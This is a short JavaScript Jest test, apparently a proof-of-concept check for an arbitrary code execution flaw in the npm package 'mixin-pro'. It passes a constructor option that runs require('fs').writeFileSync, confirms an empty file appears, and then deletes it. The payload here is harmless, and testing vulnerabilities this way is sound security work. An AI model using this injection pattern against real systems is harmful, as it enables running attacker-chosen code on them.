//
test("Arbitrary code execution in mixin-pro", () => {
  const fs = require("fs");
  const Class = require("mixin-pro").createClass;
  const path = "./mixin-pro";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let Bar1 = Class({
      constructor: require(`fs`).writeFileSync("mixin-pro", ``),
    });
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
